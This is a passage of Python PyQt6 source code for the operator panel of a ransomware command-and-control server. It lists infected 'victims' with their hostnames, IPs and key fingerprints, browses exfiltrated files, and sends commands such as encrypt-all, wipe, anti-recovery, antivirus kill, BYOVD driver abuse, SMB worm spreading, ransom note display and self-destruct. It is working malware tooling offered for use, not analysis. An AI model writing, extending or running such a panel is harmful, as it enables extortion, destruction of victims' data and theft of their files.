        layout.setSpacing(6)

        # Tabs
        tabs = QTabWidget()
        tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #333;
                border-radius: 4px;
                background: #0d0d0d;
            }
            QTabBar::tab {
                background: #1a1a1a;
                color: #888;
                padding: 8px 20px;
                border: 1px solid #333;
                border-bottom: none;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
                margin-right: 2px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QTabBar::tab:selected {
                background: #0d0d0d;
                color: #00ff00;
                border-color: #00ff00;
            }
            QTabBar::tab:hover { color: #00ffff; }
        """)

        # ─── Console tab ───
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Consolas", 10))
        self.output_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: none;
                padding: 8px;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
        """)
        tabs.addTab(self.output_text, "📟 Console")

        # ─── Hybrid tab ───
        hybrid_widget = self._build_hybrid_tab()
        tabs.addTab(hybrid_widget, "🔐 Hybrid Victims")

        # ─── History tab ───
        self.history_table = QTableWidget()
        self.history_table.setColumnCount(4)
        self.history_table.setHorizontalHeaderLabels(
            ["Time", "Victim", "Command", "Status"]
        )
        self.history_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.history_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.history_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                color: #e6edf3;
                border: none;
                gridline-color: #222;
                font-family: 'Consolas', monospace;
                font-size: 10pt;
            }
            QTableWidget::item:selected { background: #1f6feb; }
            QHeaderView::section {
                background: #1a1a1a;
                color: #00ff00;
                padding: 6px;
                border: none;
                border-bottom: 1px solid #00ff00;
                font-weight: bold;
                font-size: 10pt;
            }
        """)
        tabs.addTab(self.history_table, "📜 History")

        # ─── Exfil tab ───
        exfil_widget = self._build_exfil_tab()
        tabs.addTab(exfil_widget, "📤 Exfiltrated Files")

        layout.addWidget(tabs)

        # ─── Bottom bar ───
        bottom_bar = QWidget()
        bottom_bar.setStyleSheet("""
            QWidget {
                background: #0a0a0a;
                border: 1px solid #333;
                border-radius: 4px;
            }
        """)
        bottom_layout = QHBoxLayout(bottom_bar)
        bottom_layout.setContentsMargins(10, 6, 10, 6)
        bottom_layout.setSpacing(8)

        info = QLabel("💡 Window ini bisa diminimize. C2 dialog utama tetap berjalan.")
        info.setStyleSheet(
            "color: #666; font-size: 8pt; border: none; background: transparent;"
        )
        bottom_layout.addWidget(info)
        bottom_layout.addStretch()

        self._console_auto_scroll_cb = QCheckBox("Auto-scroll")
        self._console_auto_scroll_cb.setChecked(True)
        self._console_auto_scroll_cb.setStyleSheet(
            "color: #888; font-size: 9pt; border: none; background: transparent;"
        )
        bottom_layout.addWidget(self._console_auto_scroll_cb)

        clear_btn = QPushButton("🧹 Clear")
        clear_btn.setFixedHeight(26)
        clear_btn.setStyleSheet("""
            QPushButton {
                background: #333;
                color: #ccc;
                font-weight: bold;
                padding: 4px 12px;
                border: none;
                border-radius: 3px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #444; }
        """)
        clear_btn.clicked.connect(self._clear_console)
        bottom_layout.addWidget(clear_btn)

        copy_btn = QPushButton("📋 Copy All")
        copy_btn.setFixedHeight(26)
        copy_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                padding: 4px 12px;
                border: none;
                border-radius: 3px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        copy_btn.clicked.connect(self._copy_console)
        bottom_layout.addWidget(copy_btn)

        layout.addWidget(bottom_bar)

        win.show()
        self._console_window = win

    def _clear_console(self):
        if hasattr(self, "output_text") and self.output_text:
            self.output_text.clear()

    def _copy_console(self):
        if hasattr(self, "output_text") and self.output_text:
            text = self.output_text.toPlainText()
            if text:
                try:
                    from PyQt6.QtWidgets import QApplication

                    QApplication.clipboard().setText(text)
                    self._append_output("[+] Console copied to clipboard")
                except Exception as e:
                    self._append_output(f"[!] Copy error: {e}")

    # ═══════════════════════════════════════════════════════════════
    # HYBRID TAB
    # ═══════════════════════════════════════════════════════════════

    def _build_hybrid_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(6, 6, 6, 6)
        layout.setSpacing(6)

        info_frame = QFrame()
        info_frame.setStyleSheet("""
            QFrame {
                background: rgba(0, 255, 0, 0.05);
                border: 1px solid rgba(0, 255, 0, 0.3);
                border-radius: 4px;
                padding: 8px;
            }
        """)
        info_layout = QHBoxLayout(info_frame)
        info_layout.setContentsMargins(10, 6, 10, 6)

        info_icon = QLabel("🔐")
        info_icon.setStyleSheet(
            "font-size: 18px; border: none; background: transparent;"
        )
        info_layout.addWidget(info_icon)

        info_text = QLabel(
            "<b style='color: #00ff00;'>HYBRID Mode Victims</b><br>"
            "<span style='color: #888;'>RSA-4096 + AES-256-GCM. "
            "Decrypt requires matching RSA private key.</span>"
        )
        info_text.setStyleSheet(
            "color: #ccc; font-size: 9pt; background: transparent; border: none;"
        )
        info_layout.addWidget(info_text, 1)
        layout.addWidget(info_frame)

        toolbar = QHBoxLayout()
        toolbar.setSpacing(6)

        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.setFixedHeight(28)
        refresh_btn.setStyleSheet("""
            QPushButton {
                background: #00ff00;
                color: #000;
                font-weight: bold;
                padding: 4px 12px;
                border: none;
                border-radius: 3px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #00cc00; }
        """)
        refresh_btn.clicked.connect(self._refresh_hybrid_list)
        toolbar.addWidget(refresh_btn)

        open_keys_btn = QPushButton("📂 Open Keys Folder")
        open_keys_btn.setFixedHeight(28)
        open_keys_btn.setStyleSheet("""
            QPushButton {
                background: #6e40c9;
                color: white;
                font-weight: bold;
                padding: 4px 12px;
                border: none;
                border-radius: 3px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #8957e5; }
        """)
        open_keys_btn.clicked.connect(self._open_keys_folder)
        toolbar.addWidget(open_keys_btn)

        copy_all_btn = QPushButton("📋 Copy All Victim IDs")
        copy_all_btn.setFixedHeight(28)
        copy_all_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                padding: 4px 12px;
                border: none;
                border-radius: 3px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        copy_all_btn.clicked.connect(self._copy_all_victim_ids)
        toolbar.addWidget(copy_all_btn)

        self.hybrid_count_label = QLabel("0 hybrid victims")
        self.hybrid_count_label.setStyleSheet(
            "color: #00ff00; font-size: 9pt; font-weight: bold; padding-left: 10px;"
        )
        toolbar.addWidget(self.hybrid_count_label)
        toolbar.addStretch()

        layout.addLayout(toolbar)

        self.hybrid_table = QTableWidget()
        self.hybrid_table.setColumnCount(6)
        self.hybrid_table.setHorizontalHeaderLabels(
            ["Victim ID", "Key Fingerprint", "Hostname", "IP:Port", "Status", "Actions"]
        )
        self.hybrid_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Interactive
        )
        self.hybrid_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.hybrid_table.setSelectionBehavior(
            QAbstractItemView.SelectionBehavior.SelectRows
        )
        self.hybrid_table.setAlternatingRowColors(True)
        self.hybrid_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                alternate-background-color: #0a0d12;
                color: #e6edf3;
                border: none;
                gridline-color: #1a1a1a;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
            QTableWidget::item:selected { background: #00ff00; color: #000; }
            QHeaderView::section {
                background: #1a1a1a;
                color: #00ff00;
                padding: 5px;
                border: none;
                border-bottom: 1px solid #00ff00;
                font-weight: bold;
                font-size: 9pt;
            }
        """)

        widths = [110, 130, 150, 140, 90, 250]
        for i, w in enumerate(widths):
            self.hybrid_table.setColumnWidth(i, w)

        layout.addWidget(self.hybrid_table)

        return widget

    # ═══════════════════════════════════════════════════════════════
    # EXFIL TAB
    # ═══════════════════════════════════════════════════════════════

    def _build_exfil_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(6, 6, 6, 6)
        layout.setSpacing(6)

        toolbar = QHBoxLayout()
        toolbar.setSpacing(6)

        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.setFixedHeight(28)
        refresh_btn.setStyleSheet("""
            QPushButton {
                background: #ff00ff;
                color: white;
                font-weight: bold;
                padding: 4px 12px;
                border: none;
                border-radius: 3px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #cc33cc; }
        """)
        refresh_btn.clicked.connect(self._refresh_exfil_list)
        toolbar.addWidget(refresh_btn)

        open_folder_btn = QPushButton("📂 Open Folder")
        open_folder_btn.setFixedHeight(28)
        open_folder_btn.setStyleSheet("""
            QPushButton {
                background: #238636;
                color: white;
                font-weight: bold;
                padding: 4px 12px;
                border: none;
                border-radius: 3px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #2ea043; }
        """)
        open_folder_btn.clicked.connect(self._open_exfil_folder)
        toolbar.addWidget(open_folder_btn)

        self.exfil_info_label = QLabel("0 files")
        self.exfil_info_label.setStyleSheet(
            "color: #ff00ff; font-size: 9pt; font-weight: bold; padding-left: 10px;"
        )
        toolbar.addWidget(self.exfil_info_label)
        toolbar.addStretch()

        layout.addLayout(toolbar)

        self.exfil_table = QTableWidget()
        self.exfil_table.setColumnCount(4)
        self.exfil_table.setHorizontalHeaderLabels(
            ["Victim", "Filename", "Size", "Modified"]
        )
        self.exfil_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.exfil_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.exfil_table.setSelectionBehavior(
            QAbstractItemView.SelectionBehavior.SelectRows
        )
        self.exfil_table.setAlternatingRowColors(True)
        self.exfil_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                alternate-background-color: #0a0d12;
                color: #e6edf3;
                border: none;
                gridline-color: #1a1a1a;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
            QTableWidget::item:selected { background: #ff00ff; color: #fff; }
            QHeaderView::section {
                background: #1a1a1a;
                color: #ff00ff;
                padding: 5px;
                border: none;
                border-bottom: 1px solid #ff00ff;
                font-weight: bold;
                font-size: 9pt;
            }
        """)
        self.exfil_table.itemDoubleClicked.connect(self._open_exfil_file)
        layout.addWidget(self.exfil_table)

        info = QLabel("💡 Double-click file for open.")
        info.setStyleSheet("color: #666666; font-size: 8pt; padding: 2px;")
        layout.addWidget(info)

        return widget

    # ═══════════════════════════════════════════════════════════════
    # SERVER CONTROL
    # ═══════════════════════════════════════════════════════════════

    def _start_server(self):
        host = self.host_input.text().strip() or "0.0.0.0"
        try:
            port = int(self.port_input.text().strip() or "4444")
            web_port = int(self.web_port_input.text().strip() or "5000")
        except ValueError:
            QMessageBox.critical(self, "Error", "Ports must be numbers")
            return

        username = self.username_input.text().strip() or "admin"
        password = self.password_input.text().strip() or "admin"

        if username == "admin" and password == "admin":
            reply = QMessageBox.question(
                self,
                "⚠️ Weak Credentials",
                "You are using DEFAULT credentials (admin/admin).\n\n"
                "This is insecure. Continue anyway?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No,
            )
            if reply != QMessageBox.StandardButton.Yes:
                return

        if len(password) < 4:
            QMessageBox.warning(
                self,
                "Warning",
                "Password too short (min 4 chars). Please use stronger password.",
            )
            return

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_indicator.setText("● Running")
        self.status_indicator.setStyleSheet(
            "color: #00ff00; font-size: 10pt; font-weight: bold; border: none;"
        )

        self.host_input.setEnabled(False)
        self.port_input.setEnabled(False)
        self.web_port_input.setEnabled(False)
        self.username_input.setEnabled(False)
        self.password_input.setEnabled(False)
        self.toggle_pw_btn.setEnabled(False)

        self._set_actions_enabled(True)

        # Auto-open console window saat start
        self._open_console_window()
        self._clear_console()

        self.server_thread = C2ServerThread(host, port, web_port, password, username)
        self.server_thread.output.connect(self._append_output)
        self.server_thread.victim_update.connect(self._on_victim_update)
        self.server_thread.start()

        self._fallback_timer = QTimer(self)
        self._fallback_timer.timeout.connect(self._fallback_poll)
        self._fallback_timer.start(3000)

        self._append_output(f"[+] C2 Server started: {host}:{port}")
        self._append_output(f"[+] Web panel: http://{host}:{web_port}")
        self._append_output(f"[+] Username: {username}")
        self._append_output(f"[+] Password: {'*' * len(password)}")
        self._append_output("[+] Auth: ENABLED (session timeout: 1h)")
        self._append_output("[+] Brute-force lockout: 5 attempts → 5 min")

    def _fallback_poll(self):
        if not self.server_thread or not self.server_thread.server:
            return

        try:
            server = self.server_thread.server
            acquired = server.lock.acquire(timeout=0.5)
            if not acquired:
                return

            try:
                victims = {}
                for vid, v in server.victims.items():
                    victims[vid] = {
                        "id": vid,
                        "ip": v.get("ip", "?"),
                        "port": v.get("port", "?"),
                        "hostname": v.get("hostname", "unknown"),
                        "os": v.get("os", "unknown"),
                        "user": v.get("user", "unknown"),
                        "is_admin": v.get("is_admin", False),
                        "status": v.get("status", "unknown"),
                        "encrypted": v.get("encrypted", False),
                        "encrypted_count": v.get("encrypted_count", 0),
                        "exfiltrated_count": v.get("exfiltrated_count", 0),
                        "byovd_enabled": v.get("byovd_enabled", False),
                        "smb_worm_enabled": v.get("smb_worm_enabled", False),
                        "av_bypass": v.get("av_bypass", False),
                        "decrypt_key": v.get("decrypt_key", ""),
                        "encryption": v.get("encryption", ""),
                        "encryption_mode": v.get("encryption_mode", "unknown"),
                        "victim_id": v.get("victim_id", ""),
                        "key_fingerprint": v.get("key_fingerprint", ""),
                    }

                hybrid_count = sum(
                    1
                    for v in server.victims.values()
                    if v.get("encryption_mode") == "hybrid"
                )
                legacy_count = sum(
                    1
                    for v in server.victims.values()
                    if v.get("encryption_mode") == "legacy"
                )

                stats = {
                    "total": len(server.victims),
                    "online": sum(
                        1
                        for v in server.victims.values()
                        if v.get("status")
                        in ["registered", "active", "encrypted", "decrypted"]
                    ),
                    "admin": sum(
                        1 for v in server.victims.values() if v.get("is_admin")
                    ),
                    "encrypted": sum(
                        1 for v in server.victims.values() if v.get("encrypted")
                    ),
                    "files": sum(
                        v.get("encrypted_count", 0) for v in server.victims.values()
                    ),
                    "exfiltrated": sum(
                        v.get("exfiltrated_count", 0) for v in server.victims.values()
                    ),
                    "hybrid": hybrid_count,
                    "legacy": legacy_count,
                }
                history = list(server.command_history[-50:])
            finally:
                server.lock.release()

            self._on_victim_update(
                {"victims": victims, "stats": stats, "history": history}
            )
        except Exception as e:
            print(f"[!] Fallback poll error: {e}")

    def _stop_server(self):
        if self._fallback_timer:
            self._fallback_timer.stop()
            self._fallback_timer = None

        if self.server_thread:
            self.server_thread.stop()
            self.server_thread.wait(2000)
            self.server_thread = None

        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_indicator.setText("● Stopped")
        self.status_indicator.setStyleSheet(
            "color: #ff5555; font-size: 10pt; font-weight: bold; border: none;"
        )

        self.host_input.setEnabled(True)
        self.port_input.setEnabled(True)
        self.web_port_input.setEnabled(True)
        self.username_input.setEnabled(True)
        self.password_input.setEnabled(True)
        self.toggle_pw_btn.setEnabled(True)

        self._set_actions_enabled(False)
        self._append_output("[!] C2 Server stopped")

    def _set_actions_enabled(self, enabled):
        for attr in [
            "sel_encrypt_btn",
            "sel_decrypt_btn",
            "sel_status_btn",
            "sel_ping_btn",
            "sel_byovd_btn",
            "sel_spread_btn",
            "sel_avkill_btn",
            "sel_showgui_btn",
            "sel_decryptgui_btn",
            "sel_exfil_btn",
            "sel_wipe_btn",
            "sel_antirec_btn",
            "sel_wp_btn",
            "sel_note_btn",
            "sel_kill_btn",
            "all_status_btn",
            "all_ping_btn",
            "all_byovd_btn",
            "all_spread_btn",
            "all_avkill_btn",
            "all_showgui_btn",
            "all_decryptgui_btn",
            "all_exfil_btn",
            "all_wipe_btn",
            "all_antirec_btn",
            "all_encrypt_btn",
            "all_decrypt_btn",
        ]:
            if hasattr(self, attr):
                getattr(self, attr).setEnabled(enabled)

    def _set_selected_actions_enabled(self, enabled):
        for attr in [
            "sel_encrypt_btn",
            "sel_decrypt_btn",
            "sel_status_btn",
            "sel_ping_btn",
            "sel_byovd_btn",
            "sel_spread_btn",
            "sel_avkill_btn",
            "sel_showgui_btn",
            "sel_decryptgui_btn",
            "sel_exfil_btn",
            "sel_wipe_btn",
            "sel_antirec_btn",
            "sel_wp_btn",
            "sel_note_btn",
            "sel_kill_btn",
        ]:
            if hasattr(self, attr):
                getattr(self, attr).setEnabled(enabled)

    def _open_web_panel(self):
        host = self.host_input.text().strip()
        if host == "0.0.0.0":
            host = "127.0.0.1"
        port = self.web_port_input.text().strip() or "5000"
        url = f"http://{host}:{port}"
        try:
            import webbrowser

            webbrowser.open(url)
            self._append_output(f"[*] Opened browser: {url}")
            self._append_output("[*] Login required — use credentials above")
        except Exception as e:
            self._append_output(f"[!] Cannot open browser: {e}")

    def _open_exfil_folder(self):
        folder = os.path.join(os.getcwd(), "exfiltrated")
        if not os.path.exists(folder):
            os.makedirs(folder, exist_ok=True)
        try:
            if os.name == "nt":
                os.startfile(folder)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", folder])
            else:
                subprocess.Popen(["xdg-open", folder])
            # self._append_output(f"[*] Opened: {folder}")
        except Exception as e:
            self._append_output(f"[!] Cannot open folder: {e}")

    def _open_keys_folder(self):
        folder = os.path.join(os.getcwd(), "victim_keys")
        if not os.path.exists(folder):
            os.makedirs(folder, exist_ok=True)
        try:
            if os.name == "nt":
                os.startfile(folder)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", folder])
            else:
                subprocess.Popen(["xdg-open", folder])
            self._append_output(f"[*] Opened keys folder: {folder}")
        except Exception as e:
            self._append_output(f"[!] Cannot open folder: {e}")

    def _open_access_log(self):
        log_file = os.path.join(os.getcwd(), "c2_access.log")
        if not os.path.exists(log_file):
            self._append_output(f"[!] Access log not found: {log_file}")
            return
        try:
            if os.name == "nt":
                os.startfile(log_file)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", log_file])
            else:
                subprocess.Popen(["xdg-open", log_file])
            self._append_output(f"[*] Opened: {log_file}")
        except Exception as e:
            self._append_output(f"[!] Cannot open: {e}")

    # ═══════════════════════════════════════════════════════════════
    # VICTIM ACTIONS
    # ═══════════════════════════════════════════════════════════════

    def _send_to_selected(self, command):
        if not self.current_selected_victim:
            QMessageBox.warning(self, "Warning", "No victim selected")
            return
        if not self.server_thread:
            return

        if command == "decrypt":
            victim = self.victims_data.get(self.current_selected_victim, {})
            if victim.get("encryption_mode") == "hybrid":
                reply = QMessageBox.question(
                    self,
                    "⚠️ Hybrid Mode",
                    f"Victim {self.current_selected_victim} is in HYBRID mode.\n\n"
                    f"Decrypt via C2 akan DITOLAK oleh victim.\n\n"
                    f"Untuk decrypt, gunakan:\n"
                    f"  1. Show GUI → victim paste RSA private key\n"
                    f"  2. Atau kirim private key ke victim\n\n"
                    f"Tetap kirim command decrypt?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                )
                if reply != QMessageBox.StandardButton.Yes:
                    return

        success, msg = self.server_thread.send_command(
            self.current_selected_victim, {"type": command}
        )
        if success:
            self._append_output(f"[→] {command} → {self.current_selected_victim}")
        else:
            self._append_output(
                f"[!] Failed: {command} → {self.current_selected_victim}: {msg}"
            )

    def _send_to_all(self, command):
        if not self.server_thread:
            return

        if command == "decrypt":
            hybrid_count = sum(
                1
                for v in self.victims_data.values()
                if v.get("encryption_mode") == "hybrid"
            )
            if hybrid_count > 0:
                reply = QMessageBox.question(
                    self,
                    "⚠️ Hybrid Victims Detected",
                    f"{hybrid_count} victim(s) in HYBRID mode.\n\n"
                    f"Decrypt command akan DITOLAK oleh mereka.\n\n"
                    f"Lanjutkan?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                )
                if reply != QMessageBox.StandardButton.Yes:
                    return

        results = self.server_thread.send_command_all({"type": command})
        success_count = sum(1 for _, ok, _ in results if ok)

        self._append_output(
            f"[→] BULK: {command} sent to {success_count}/{len(results)} victims"
        )

    def _confirm_kill_selected(self):
        if not self.current_selected_victim:
            return
        reply = QMessageBox.question(
            self,
            "Confirm Kill",
            f"Kill victim {self.current_selected_victim}?\n"
            f"This will self-destruct the payload.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply == QMessageBox.StandardButton.Yes:
            self._send_to_selected("kill")

    def _confirm_encrypt_all(self):
        count = len(self.victims_data)
        if count == 0:
            QMessageBox.warning(self, "Warning", "No victims connected")
            return
        reply = QMessageBox.question(
            self,
            "Confirm Encrypt All",
            f"Encrypt ALL files on {count} victims?\n\n"
            f"⚠️ This is destructive and irreversible without the decryption key.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply == QMessageBox.StandardButton.Yes:
            self._send_to_all("encrypt")

    def _confirm_decrypt_all(self):
        count = len(self.victims_data)
        if count == 0:
            return

        hybrid_count = sum(
            1
            for v in self.victims_data.values()
            if v.get("encryption_mode") == "hybrid"
        )

        msg = f"Decrypt all files on {count} victims?"
        if hybrid_count > 0:
            msg += (
                f"\n\n⚠️ {hybrid_count} victim(s) in HYBRID mode "
                f"akan DITOLAK decrypt command."
            )

        reply = QMessageBox.question(
            self,
            "Confirm Decrypt All",
            msg,
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply == QMessageBox.StandardButton.Yes:
            self._send_to_all("decrypt")

    def _on_victim_selected(self):
        selected = self.victims_table.selectedItems()
        if not selected:
            self.current_selected_victim = None
            self._set_selected_actions_enabled(False)
            if hasattr(self, "selected_info_label"):
                self.selected_info_label.setText(
                    "⚠ No victim selected\n\nClick a row in victims table"
                )
                self.selected_info_label.setStyleSheet(
                    "color: #888888; font-size: 9pt; "
                    "border: 1px solid #333; background: #0d0d0d; "
                    "padding: 8px; border-radius: 3px;"
                )
            return

        row = selected[0].row()
        item = self.victims_table.item(row, 0)
        if item:
            self.current_selected_victim = item.text()
            self._set_selected_actions_enabled(True)

            v = self.victims_data.get(self.current_selected_victim, {})
            hostname = v.get("hostname", "?")
            ip = v.get("ip", "?")
            os_type = v.get("os", "?")
            mode = v.get("encryption_mode", "?")
            is_admin = "👑" if v.get("is_admin") else "👤"
            status = v.get("status", "?")
            victim_id = v.get("victim_id", "")

            info_text = (
                f"{is_admin} <b>{hostname}</b><br>"
                f"<span style='color:#00ffff'>{ip}</span> • "
                f"{os_type} • {mode.upper()}<br>"
                f"<span style='color:#888'>Status: {status}</span>"
            )
            if victim_id:
                info_text += f"<br><span style='color:#00ff00'>🆔 {victim_id}</span>"

            self.selected_info_label.setText(info_text)
            self.selected_info_label.setStyleSheet(
                "color: #ffffff; font-size: 9pt; "
                "border: 1px solid #00ff00; background: #0d0d0d; "
                "padding: 8px; border-radius: 3px; "
                "border-left: 3px solid #00ff00;"
            )

            self._append_output(
                f"[*] Selected: {self.current_selected_victim} ({hostname})"
            )

    # ═══════════════════════════════════════════════════════════════
    # HYBRID HANDLERS
    # ═══════════════════════════════════════════════════════════════

    def _refresh_hybrid_list(self):
        if not hasattr(self, "hybrid_table"):
            return

        self.hybrid_table.setRowCount(0)

        hybrids = []
        for vid, v in self.victims_data.items():
            if v.get("encryption_mode") == "hybrid":
                hybrids.append((vid, v))

        self.hybrid_table.setRowCount(len(hybrids))

        for row, (vid, v) in enumerate(hybrids):
            victim_id_item = QTableWidgetItem(v.get("victim_id", "") or "-")
            victim_id_item.setForeground(QColor("#00ffff"))
            victim_id_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            self.hybrid_table.setItem(row, 0, victim_id_item)

            fp_item = QTableWidgetItem(v.get("key_fingerprint", "") or "-")
            fp_item.setForeground(QColor("#00ff00"))
            fp_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            self.hybrid_table.setItem(row, 1, fp_item)

            host_item = QTableWidgetItem(v.get("hostname", "unknown"))
            host_item.setForeground(QColor("#8be9fd"))
            self.hybrid_table.setItem(row, 2, host_item)

            ip_item = QTableWidgetItem(f"{v.get('ip', '?')}:{v.get('port', '?')}")
            self.hybrid_table.setItem(row, 3, ip_item)

            status = v.get("status", "unknown")
            status_item = QTableWidgetItem(status)
            status_colors = {
                "connected": "#ffff00",
                "registered": "#00ffff",
                "active": "#00ff00",
                "encrypted": "#ff0000",
                "decrypted": "#00ff00",
                "disconnected": "#555555",
                "killed": "#ff00ff",
            }
            status_item.setForeground(QColor(status_colors.get(status, "#ffffff")))
            self.hybrid_table.setItem(row, 4, status_item)

            actions_widget = QWidget()
            actions_layout = QHBoxLayout(actions_widget)
            actions_layout.setContentsMargins(2, 2, 2, 2)
            actions_layout.setSpacing(3)

            copy_vid_btn = QPushButton("📋 ID")
            copy_vid_btn.setFixedHeight(22)
            copy_vid_btn.setStyleSheet("""
                QPushButton {
                    background: #1f6feb;
                    color: white;
                    font-weight: bold;
                    font-size: 8pt;
                    padding: 2px 6px;
                    border: none;
                    border-radius: 2px;
                }
                QPushButton:hover { background: #388bfd; }
            """)
            copy_vid_btn.setToolTip("Copy Victim ID")
            victim_id_val = v.get("victim_id", "")
            copy_vid_btn.clicked.connect(
                lambda checked, vid=victim_id_val: self._copy_to_clipboard(
                    vid, "Victim ID"
                )
            )
            actions_layout.addWidget(copy_vid_btn)

            copy_fp_btn = QPushButton("📋 FP")
            copy_fp_btn.setFixedHeight(22)
            copy_fp_btn.setStyleSheet("""
                QPushButton {
                    background: #6e40c9;
                    color: white;
                    font-weight: bold;
                    font-size: 8pt;
                    padding: 2px 6px;
                    border: none;
                    border-radius: 2px;
                }
                QPushButton:hover { background: #8957e5; }
            """)
            copy_fp_btn.setToolTip("Copy Key Fingerprint")
            fp_val = v.get("key_fingerprint", "")
            copy_fp_btn.clicked.connect(
                lambda checked, fp=fp_val: self._copy_to_clipboard(fp, "Fingerprint")
            )
            actions_layout.addWidget(copy_fp_btn)

            show_gui_btn = QPushButton("🖥️ GUI")
            show_gui_btn.setFixedHeight(22)
            show_gui_btn.setStyleSheet("""
                QPushButton {
                    background: #00ffff;
                    color: #000;
                    font-weight: bold;
                    font-size: 8pt;
                    padding: 2px 6px;
                    border: none;
                    border-radius: 2px;
                }
                QPushButton:hover { background: #33ffff; }
            """)
            show_gui_btn.setToolTip("Show ransom GUI on victim")
            show_gui_btn.clicked.connect(
                lambda checked, sid=vid: self._send_to_specific(sid, "show_gui")
            )
            actions_layout.addWidget(show_gui_btn)

            status_btn = QPushButton("📊")
            status_btn.setFixedHeight(22)
            status_btn.setStyleSheet("""
                QPushButton {
                    background: #1f6feb;
                    color: white;
                    font-weight: bold;
                    font-size: 8pt;
                    padding: 2px 6px;
                    border: none;
                    border-radius: 2px;
                }
                QPushButton:hover { background: #388bfd; }
            """)
            status_btn.setToolTip("Get status")
            status_btn.clicked.connect(
                lambda checked, sid=vid: self._send_to_specific(sid, "status")
            )
            actions_layout.addWidget(status_btn)

            actions_layout.addStretch()
            self.hybrid_table.setCellWidget(row, 5, actions_widget)

        self.hybrid_count_label.setText(f"{len(hybrids)} hybrid victims")

    def _send_to_specific(self, client_id, command):
        if not self.server_thread:
            return
        success, msg = self.server_thread.send_command(client_id, {"type": command})
        if success:
            self._append_output(f"[→] {command} → {client_id}")
        else:
            self._append_output(f"[!] Failed: {command} → {client_id}: {msg}")

    def _copy_all_victim_ids(self):
        ids = []
        for v in self.victims_data.values():
            if v.get("encryption_mode") == "hybrid" and v.get("victim_id"):
                ids.append(
                    f"{v.get('victim_id')} | {v.get('key_fingerprint')} | "
                    f"{v.get('hostname')} | {v.get('ip')}"
                )
        if not ids:
            QMessageBox.warning(self, "Warning", "No hybrid victims")
            return

        text = "\n".join(ids)
        self._copy_to_clipboard(text, f"{len(ids)} victim IDs")

    def _copy_to_clipboard(self, text, label="Data"):
        if not text:
            return
        try:
            from PyQt6.QtWidgets import QApplication

            clipboard = QApplication.clipboard()
            clipboard.setText(text)
            self._append_output(f"[+] {label} copied to clipboard")
        except Exception as e:
            self._append_output(f"[!] Copy error: {e}")

    # ═══════════════════════════════════════════════════════════════
    # EXFIL HANDLERS
    # ═══════════════════════════════════════════════════════════════

    def _refresh_exfil_list(self):
        if not hasattr(self, "exfil_table"):
            return

        self.exfil_table.setRowCount(0)

        exfil_dir = os.path.join(os.getcwd(), "exfiltrated")
        if not os.path.exists(exfil_dir):
            self.exfil_info_label.setText("0 files (folder not found)")
            return

        rows = []
        try:
            for victim_id in sorted(os.listdir(exfil_dir)):
                victim_path = os.path.join(exfil_dir, victim_id)
                if not os.path.isdir(victim_path):
                    continue
                for fname in sorted(os.listdir(victim_path)):
                    fpath = os.path.join(victim_path, fname)
                    if os.path.isfile(fpath):
                        size = os.path.getsize(fpath)
                        if size < 1024:
                            size_str = f"{size} B"
                        elif size < 1024 * 1024:
                            size_str = f"{size / 1024:.1f} KB"
                        else:
                            size_str = f"{size / (1024 * 1024):.2f} MB"

                        modified = datetime.fromtimestamp(
                            os.path.getmtime(fpath)
                        ).strftime("%Y-%m-%d %H:%M:%S")

                        rows.append((victim_id, fname, size_str, modified, fpath))
        except Exception as e:
            self._append_output(f"[!] Exfil list error: {e}")

        self.exfil_table.setRowCount(len(rows))

        for row, (vid, fname, size_str, modified, fpath) in enumerate(rows):
            vid_item = QTableWidgetItem(vid)
            vid_item.setForeground(QColor("#ffff00"))
            vid_item.setData(Qt.ItemDataRole.UserRole, fpath)
